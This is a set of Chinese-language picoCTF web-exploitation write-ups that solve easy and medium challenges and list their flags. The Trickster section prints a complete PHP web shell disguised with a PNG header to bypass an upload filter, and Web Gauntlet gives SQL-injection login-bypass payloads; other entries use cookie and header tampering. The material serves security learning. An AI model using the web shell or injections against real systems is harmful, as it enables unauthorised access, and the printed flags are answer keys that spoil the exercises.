# web expoliation
[toc]
## easy
### GET aHEAD
Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:45028/
利用BURP SUITE攔截，send to repeater
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_39e87a10d7b27674360734f1dd64ab4e.png)
修改post 改成head(獲取僅標頭信息而不獲取實際內容的資源信息)
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_4adbb778af0cd437f8bdf7657071bcf0.png)
ans:picoCTF{r3j3ct_th3_du4l1ty_775f2530}
### Insp3ct0r
Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/41511/ 
- 點進連結後
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_196c9e4203f9b8c84385aa078c743a35.png)
- 提示說如何在瀏覽器上檢查網頁程式碼？
- 點開網頁程式碼
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_e07a5c8d7fdf28617b68569e7ed76463.png)
- 發現Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3
- 了解到另外兩部分的flag應該是藏在css和javascript
- 點開第五行和第六行的連結
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_964a54b5ddc7dc41c89c59a796c1efb1.png)

![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_0fb4a5f14116168c131cced7892047df.png)
- 可得到另外兩部分的flag
- ans:picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}
### cookies
- 將cookie name設為18
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_cad512bfd736e327bea4cf6add089ced.png)
- ans:picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd

### logon
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/13594
- 點進連結後
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_e9343ab6fad6b2aaa0f0167c5ddbbc84.png)
- 先用joe和h登入
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_509493dd3f411494a03eec252bd68421.png)
- 可在cookie看到username和password
- 此外還看到一個admin的值是False
- 將它改成True再重整後
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_4e18fd65a3227989718d228a4fb85a4e.png)
- ans:picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}

### Scavenger Hunt
There is some interesting information hidden around this site http://mercury.picoctf.net:5080/. Can you find it?
- 點進網址後，檢查網頁程式碼
- 在html的頁面能發現第一部份的flag
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_5e61fe4380228363880365bc4f3ad545.png)
- 猜測第二部分在css裡，嘻嘻猜中了
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_01478b99f09bf28b725994dcf534a62d.png)
- 按照題目尿型，第三部分應該在javascript
- 但發現了這句(How can I keep Google from indexing my website?)
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_9abb75d1be3ad72f0fe470411242f75d.png)
- 是要藏什麼讓google不能查?
- 利用robots.txt，找到了第三部分
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_11e21913f5a36382132c5daa7a19ae22.png)
- 另一個提示透過大寫的“Access”，我們可以猜測他們可能正在談論.htaccess檔案。
- `.htaccess`（HyperText Access）是一個在 Apache Web 伺服器上用來配置網站設置的配置文件。這個文件允許使用者自定義伺服器的行為，包括 URL 重寫、訪問控制、重新導向等等。
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_341b52093332bde9b9896874025df9cb.png)
- 給的另一個提示跟mac和store有關，應該是指.DS_Store
- .DS_Store 是 macOS 操作系統中用於存儲目錄自定義屬性的隱藏文件。這個文件包含有關目錄的顯示設置、圖標位置、自定義視圖選項等信息。
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_deb4040da9c3167a47e21cf2ea76b716.png)
- ans:picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_35844447}

## medium
### SOAP

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

![](https://g0v.hackmd.io/_uploads/B13Xg-e2Je.png)

![](https://g0v.hackmd.io/_uploads/Skm7WZgnkx.png)

![](https://g0v.hackmd.io/_uploads/rke8Wblnye.png)

![](https://g0v.hackmd.io/_uploads/Hye3D-Zghyl.png)

### Trickster
- 打開後是一個要上傳png檔的網站
![](https://g0v.hackmd.io/_uploads/BydA7_dcye.png)
- 檢查了/robots.txt，它引導我進入/instructions.txt
![](https://g0v.hackmd.io/_uploads/ryaWVuOqJl.png)

- 從/instructions.txt中知道，我們上傳的檔案需要有.png副檔名，並且前幾個位元組包含十六進位的' PNG '：「50 4E 47」。我們也可以猜測上傳的檔案會保存在/uploads/==filename==
    
![](https://g0v.hackmd.io/_uploads/BJ374OOqyx.png)

- 從[easy-simple-php-webshell.php · GitHub](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)下載了 web shell ，它可以為我產生一個命令列介面，以便遠端在伺服器上執行命令。在此之前，我們需要滿足上傳文件的要求。伺服器僅檢查前幾個字元是否為“ PNG ”，因此我將它們放在程式碼的開頭
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
- 轉到 /uploads/PNG.png.php 並取得一個命令列介面來執行命令
![](https://g0v.hackmd.io/_uploads/HJKhSdd9kg.png)
- 它從根目錄（' / '）開始搜尋txt文件

```
find / -name "*.txt"
```
- 找到一個特別的txt檔(GNTDOMBWGIZDE.txt)
![](https://g0v.hackmd.io/_uploads/HkewrOuqJx.png)
- 將它顯示出來
```
cat /var/www/html/GNTDOMBWGIZDE.txt
```
![](https://g0v.hackmd.io/_uploads/HkXcBud91e.png)

- ans:picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}

### Some Assembly Required 1
http://mercury.picoctf.net:37669/index.html
- 點進連結
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_781951bfabd8b231547a0fa6805d6da4.png)
- 先隨意輸入
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_c80c95c1c10fb97c82f94af336f34ea6.png)
- 按F12到NETWORK，重整後會發現G82XCw5CX3.js
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_afa07f07158db972490b65e21e395709.png)
- 在G82XCw5CX3.js裡的 ./JIFxzHyW8W應該是跟目錄的一些檔案，下載該文件
```
wget http://mercury.picoctf.net:55336/JIFxzHyW8W
```
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_ade6527862bfa5b7c72ac2c03d58f447.png)
- ANS:picoCTF{51e513c498950a515b1aab5e941b2615}

### find me
Help us test the form by submiting the username as test and password as test!
Additional details will be available after launching your challenge instance.
- 利用burp suite打開網站後 輸入test、test!
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_7ecdac5fb22c8e8dc417f0e302f937dd.png)
- 在login頁面的response可看到id=cGljb0NURntwcm94aWVzX2Fs
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_475a687bf0df28007ec8b2448dffa654.png)
- 提示說「有重定向嗎？」，進入登入畫面後，burp suite有收到兩個next page，另一個的id與上一個不同，id=bF90aGVfd2F5X2RmNDRjOTRjfQ==
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_3bd0d6a4d4c3823633109c3c8fb863e0.png)
- 將這兩個id合併(cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5X2RmNDRjOTRjfQ==)進行base64解碼
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_24668d8473c859ec32c4f8f04a5baf2d.png)
- ans:picoCTF{proxies_all_the_way_df44c94c}

### picobrowser
This website can be rendered only by picobrowser, go and catch the flag! https://jupiter.challenges.picoctf.org/problem/26704/ 
- 點進連結後，點下flag顯示我不是picobrowser，後面那串是在顯示user-agent
- 利用burp suite進行攔截，將user-agent改成picobrowser
- 重整後可在response的程式碼看到flag
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_6752a208c38a36adabc784fcf2f47bb8.png)
- ans:picoCTF{p1c0_s3cr3t_ag3nt_e9b160d0}

### Web Gauntlet
- 看來是sql injection
![](https://g0v.hackmd.io/_uploads/HkBAnJsokg.png)
- 第一關要求不能有or
![](https://g0v.hackmd.io/_uploads/HJIZTyioJl.png)
- 輸入`admin'--`，密碼隨意
 ![](https://g0v.hackmd.io/_uploads/SJHXpysi1x.png)

- 第二關要求不能有or and like = --
![](https://g0v.hackmd.io/_uploads/Skjv6JisJe.png)

- 輸入`admin'/*`
![](https://g0v.hackmd.io/_uploads/ryK5pJoo1g.png)

- 第三關要求不能有or and = like > < --
![](https://g0v.hackmd.io/_uploads/r1qAa1ojJg.png)

- 一樣輸入`admin'/*`

- 第四關要求不能有`or and = like > < -- admin`
![](https://g0v.hackmd.io/_uploads/BJ57RyjjJl.png)
- 第五關要求不能有`or and = like > < -- union admin`
- 輸入`a'||'d'||'m'||'i'||'n'/*`
![](https://g0v.hackmd.io/_uploads/Hkc41ljj1x.png)

![](https://g0v.hackmd.io/_uploads/SyWiH1looJg.png)
- 在filter.php最下面找到flag
![](https://g0v.hackmd.io/_uploads/Syl6LyejsJe.png)

- ans:picoCTF{y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5}
## hard